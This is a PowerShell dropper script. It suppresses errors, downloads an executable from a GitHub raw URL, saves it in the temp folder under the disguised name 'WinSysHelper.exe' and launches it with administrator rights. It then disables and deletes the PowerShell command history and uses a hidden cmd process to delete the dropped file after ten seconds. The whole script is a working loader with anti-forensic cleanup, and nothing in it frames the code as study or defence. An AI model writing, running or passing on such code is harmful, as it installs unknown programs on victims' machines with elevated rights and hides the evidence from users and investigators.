$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
$output = "$env:TEMP\WinSysHelper.exe"

Invoke-WebRequest -Uri $url -OutFile $output

Start-Process -FilePath $output -Verb RunAs

try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force

Start-Process cmd -ArgumentList "/c timeout /t 10 && del /f /q `"$output`"" -WindowStyle Hidden

exit
